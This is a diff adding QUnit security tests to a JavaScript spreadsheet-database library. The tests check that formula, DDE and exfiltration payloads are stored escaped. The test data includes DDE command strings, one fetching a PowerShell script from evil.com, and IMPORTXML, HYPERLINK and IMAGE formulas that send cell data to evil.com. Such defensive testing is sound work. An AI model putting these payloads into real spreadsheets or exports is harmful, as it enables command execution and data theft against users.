@@ -3315,6 +3315,424 @@ function runner() {
         "Should create record successfully"
       );
     });
+
+    // CSV Injection Security Tests
+    QUnit.module("CSV Injection Security Tests", function () {
+      QUnit.test("Basic Formula Injection Prevention", function (assert) {
+        function redactEmailForLogs_(email) {
+          if (typeof email !== "string") return email;
+          const at = email.indexOf("@");
+          if (at === -1) return email.length ? email.charAt(0) + "***" : "";
+          return email.length ? email.charAt(0) + "***" + email.slice(at) : "";
+        }
+
+        const tableConfig = {
+          tableName: "USERS_MALICIOUS_FORMULA_PREVENTION",
+          fields: { name: "string", email: "string" },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        // Attempt injection with common formula starters
+        const testCases = [
+          { name: "=1+1", email: "formula@test.com" },
+          { name: "+1+1", email: "plus@test.com" },
+          { name: "-1-1", email: "minus@test.com" },
+          { name: "@SUM(A1:A10)", email: "at@test.com" },
+        ];
+
+        testCases.forEach(function (testData, index) {
+          console.log("[CSV Injection] Basic Formula Injection Prevention", {
+            case: index + 1,
+            inputName: testData && testData.name,
+            inputEmail: redactEmailForLogs_(testData && testData.email),
+          });
+
+          const result = db.create(
+            "USERS_MALICIOUS_FORMULA_PREVENTION",
+            testData,
+            ["name", "email"]
+          );
+          console.log("[CSV Injection] create result", {
+            case: index + 1,
+            status: result && result.status,
+            id: result && result.id,
+            error: result && result.error,
+            message: result && result.message,
+          });
+          assert.equal(result.status, 200, "Create should succeed");
+
+          const record = db.read(
+            "USERS_MALICIOUS_FORMULA_PREVENTION",
+            result.id
+          );
+          const storedName = record && record.data && record.data.name;
+          console.log("[CSV Injection] read result", {
+            case: index + 1,
+            status: record && record.status,
+            id: result && result.id,
+            storedNameType: typeof storedName,
+            storedName: storedName,
+            dataKeys:
+              record && record.data ? Object.keys(record.data).sort() : null,
+          });
+          assert.equal(record.status, 200, "Read should succeed");
+
+          // Check if the dangerous character was escaped
+          const isEscaped =
+            typeof storedName === "string" && storedName.startsWith("'");
+
+          assert.ok(
+            isEscaped,
+            `Test case ${index + 1}: "${
+              testData.name
+            }" should be sanitized (storedName=${JSON.stringify(
+              storedName
+            )}, type=${typeof storedName})`
+          );
+        });
+      });
+
+      QUnit.test(
+        "Command Execution Prevention (DDE Attacks)",
+        function (assert) {
+          const tableConfig = {
+            tableName: "MALICIOUS_DDE_ATTACK_PREVENTION",
+            fields: { payload: "string", description: "string" },
+          };
+          db.createTable(tableConfig);
+          db.putTableIntoDbContext(tableConfig);
+
+          // Attempt DDE attacks
+          const ddeCases = [
+            '=cmd|"/c calc"!A1',
+            '=cmd|"/c powershell wget http://evil.com/shell.ps1"!A1',
+            '@SUM(1+1)*cmd|"/c calc"!A1',
+          ];
+
+          ddeCases.forEach(function (payload, index) {
+            console.log("[CSV Injection] DDE Attacks", {
+              case: index + 1,
+              inputPayloadType: typeof payload,
+              inputPayloadPreview:
+                typeof payload === "string" ? payload.slice(0, 80) : payload,
+            });
+
+            const result = db.create(
+              "MALICIOUS_DDE_ATTACK_PREVENTION",
+              {
+                payload: payload,
+                description: "DDE test case",
+              },
+              ["payload", "description"]
+            );
+            console.log("[CSV Injection] DDE create result", {
+              case: index + 1,
+              status: result && result.status,
+              id: result && result.id,
+              error: result && result.error,
+              message: result && result.message,
+            });
+            assert.equal(result.status, 200, "Create should succeed");
+
+            const record = db.read(
+              "MALICIOUS_DDE_ATTACK_PREVENTION",
+              result.id
+            );
+            const storedPayload = record && record.data && record.data.payload;
+            console.log("[CSV Injection] DDE read result", {
+              case: index + 1,
+              status: record && record.status,
+              id: result && result.id,
+              storedPayloadType: typeof storedPayload,
+              storedPayloadPreview:
+                typeof storedPayload === "string"
+                  ? storedPayload.slice(0, 120)
+                  : storedPayload,
+              dataKeys:
+                record && record.data ? Object.keys(record.data).sort() : null,
+            });
+            assert.equal(record.status, 200, "Read should succeed");
+
+            const isEscaped =
+              typeof storedPayload === "string" &&
+              storedPayload.startsWith("'");
+
+            assert.ok(
+              isEscaped,
+              `DDE case ${index + 1} should be blocked: "${payload.substring(
+                0,
+                30
+              )}..."`
+            );
+          });
+        }
+      );
+
+      QUnit.test("Data Exfiltration Prevention", function (assert) {
+        const tableConfig = {
+          tableName: "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
+          fields: { data: "string", type: "string" },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        // Attempt data exfiltration
+        const exfilCases = [
+          '=IMPORTXML("http://evil.com/?data="&A1:Z100, "//a")',
+          '=HYPERLINK("http://evil.com/steal?data="&A1,"Click")',
+          '=IMAGE("http://evil.com/track?data="&A1)',
+        ];
+
+        exfilCases.forEach(function (payload, index) {
+          console.log("[CSV Injection] Exfiltration", {
+            case: index + 1,
+            inputPayloadType: typeof payload,
+            inputPayloadPreview:
+              typeof payload === "string" ? payload.slice(0, 100) : payload,
+          });
+
+          const result = db.create(
+            "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
+            {
+              data: payload,
+              type: "exfil attempt",
+            },
+            ["data", "type"]
+          );
+          console.log("[CSV Injection] Exfil create result", {
+            case: index + 1,
+            status: result && result.status,
+            id: result && result.id,
+            error: result && result.error,
+            message: result && result.message,
+          });
+          assert.equal(result.status, 200, "Create should succeed");
+
+          const record = db.read(
+            "EXFIL_TEST_DATA_EXFILTRATION_PREVENTION",
+            result.id
+          );
+          const storedData = record && record.data && record.data.data;
+          console.log("[CSV Injection] Exfil read result", {
+            case: index + 1,
+            status: record && record.status,
+            id: result && result.id,
+            storedDataType: typeof storedData,
+            storedDataPreview:
+              typeof storedData === "string"
+                ? storedData.slice(0, 140)
+                : storedData,
+            dataKeys:
+              record && record.data ? Object.keys(record.data).sort() : null,
+          });
+          assert.equal(record.status, 200, "Read should succeed");
+
+          const isEscaped =
+            typeof storedData === "string" && storedData.startsWith("'");
+
+          assert.ok(isEscaped, `Exfil case ${index + 1} should be blocked`);
+        });
+      });
+
+      QUnit.test("Normal Data Integrity", function (assert) {
+        const tableConfig = {
+          tableName: "NORMAL_DATA_INTEGRITY_PREVENTION",
+          fields: {
+            name: "string",
+            email: "string",
+            age: "number",
+            active: "boolean",
+            created: "date",
+          },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        // Normal, safe data
+        const normalData = {
+          name: "John Doe",
+          email: "john.doe@example.com",
+          age: 30,
+          active: true,
+          created: new Date("2024-01-15"),
+        };
+
+        const result = db.create(
+          "NORMAL_DATA_INTEGRITY_PREVENTION",
+          normalData,
+          ["name", "email", "age", "active", "created"]
+        );
+        assert.equal(result.status, 200, "Create should succeed");
+
+        const record = db.read("NORMAL_DATA_INTEGRITY_PREVENTION", result.id);
+        assert.equal(record.status, 200, "Read should succeed");
+
+        // Verify data integrity
+        assert.equal(record.data.name, "John Doe", "Name should be unchanged");
+        assert.equal(
+          record.data.email,
+          "john.doe@example.com",
+          "Email should be unchanged"
+        );
+        assert.equal(record.data.age, 30, "Age should be unchanged");
+        // Note: active is stored as string in the sheet
+        assert.ok(
+          record.data.active === true || record.data.active === "true",
+          "Active should be unchanged"
+        );
+      });
+
+      QUnit.test("Update Operation Security", function (assert) {
+        const tableConfig = {
+          tableName: "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          fields: { name: "string", status: "string" },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        // Create normal record
+        const createResult = db.create(
+          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          {
+            name: "Normal User",
+            status: "active",
+          },
+          ["name", "status"]
+        );
+        assert.equal(createResult.status, 200, "Create should succeed");
+
+        // Try to update with malicious data
+        const updateResult = db.update(
+          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          createResult.id,
+          {
+            name: '=cmd|"/c calc"!A1',
+            status: "=1+1",
+          },
+          ["name", "status"]
+        );
+        assert.equal(updateResult.status, 200, "Update should succeed");
+
+        const record = db.read(
+          "UPDATES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          createResult.id
+        );
+        assert.equal(record.status, 200, "Read should succeed");
+
+        const nameEscaped = record.data.name.startsWith("'");
+        const statusEscaped = record.data.status.startsWith("'");
+
+        assert.ok(nameEscaped, "Update name should be sanitized");
+        assert.ok(statusEscaped, "Update status should be sanitized");
+      });
+
+      QUnit.test("Edge Cases", function (assert) {
+        const tableConfig = {
+          tableName: "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          fields: { test: "string" },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        const edgeCases = [
+          { value: "", description: "Empty string" },
+          { value: " =1+1", description: "Space before formula" },
+          { value: "==1+1", description: "Double equals" },
+          { value: "\t=1+1", description: "Tab character" },
+          { value: "\r=1+1", description: "Carriage return" },
+          { value: "Normal=1+1", description: "Formula in middle" },
+        ];
+
+        edgeCases.forEach(function (testCase, index) {
+          const result = db.create(
+            "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+            { test: testCase.value },
+            ["test"]
+          );
+          assert.equal(result.status, 200, "Create should succeed");
+
+          const record = db.read(
+            "EDGE_CASES_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+            result.id
+          );
+          assert.equal(record.status, 200, "Read should succeed");
+
+          // Log the result for debugging
+          console.log(
+            `Case ${index + 1} (${testCase.description}): "${
+              testCase.value
+            }" -> "${record.data.test}"`
+          );
+
+          // Empty string should remain empty
+          if (testCase.value === "") {
+            assert.equal(
+              record.data.test,
+              "",
+              `Case ${index + 1}: Empty string should remain empty`
+            );
+          }
+          // Values starting with dangerous chars should be escaped
+          else if (
+            testCase.value.charAt(0) === "=" ||
+            testCase.value.charAt(0) === "+" ||
+            testCase.value.charAt(0) === "-" ||
+            testCase.value.charAt(0) === "@" ||
+            testCase.value.charAt(0) === "\t" ||
+            testCase.value.charAt(0) === "\r"
+          ) {
+            assert.ok(
+              record.data.test.startsWith("'"),
+              `Case ${index + 1}: "${testCase.description}" should be escaped`
+            );
+          }
+          // Values with formula in middle should not be escaped (not starting with dangerous char)
+          else if (testCase.description === "Formula in middle") {
+            assert.equal(
+              record.data.test,
+              testCase.value,
+              `Case ${index + 1}: Formula in middle should not be escaped`
+            );
+          }
+        });
+      });
+
+      QUnit.test("Quick Security Check", function (assert) {
+        const tableConfig = {
+          tableName: "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          fields: { payload: "string" },
+        };
+        db.createTable(tableConfig);
+        db.putTableIntoDbContext(tableConfig);
+
+        // Test the most common attack vector
+        const result = db.create(
+          "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          {
+            payload: '=cmd|"/c calc"!A1',
+          },
+          ["payload"]
+        );
+        assert.equal(result.status, 200, "Create should succeed");
+
+        const record = db.read(
+          "QUICK_TEST_MALICIOUS_DATA_INTEGRITY_PREVENTION",
+          result.id
+        );
+        assert.equal(record.status, 200, "Read should succeed");
+
+        assert.ok(
+          record.data.payload.startsWith("'"),
+          "Malicious payload should be escaped"
+        );
+        assert.equal(
+          record.data.payload,
+          '\'=cmd|"/c calc"!A1',
+          "Payload should be stored as text with leading quote"
+        );
+      });
+    });
   });
 }
 
